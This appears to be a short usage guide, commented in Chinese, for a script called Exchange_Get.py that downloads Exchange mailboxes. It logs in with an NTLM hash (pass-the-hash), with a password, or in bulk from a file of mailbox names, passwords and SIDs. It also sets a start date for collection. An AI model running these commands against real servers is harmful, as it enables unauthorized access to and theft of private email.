```sh
python Exchange_Get.py -t 0 -s test.com -u administrator@test.com -p 84830468d80ef86dee1c4597ff70419c:84830468d80ef86dee1c4597ff70419c -c 1.ini -pa mailbox.txt # 用hash收取邮件

python Exchange_Get.py -t 0 -s test.com -u administrator@test.com -p 1qaz2wsx!@# -c 1.ini -pa mailbox.txt # 用密码收取邮件

python Exchange_Get.py -t 1 -s test.com -u administrator@test.com -p 84830468d80ef86dee1c4597ff70419c:84830468d80ef86dee1c4597ff70419c -c 1.ini -pa mailbox.txt # 当使用1模式时，-u和-p两个选项失效。程序将会从mailbox中获取凭证收取邮件
```
mailbox格式如下
```text
邮箱名 口令 用户sid
```
1.ini格式如下，意识是收取从什么时间以后的邮件
```text
2024-03-04 23:21
```
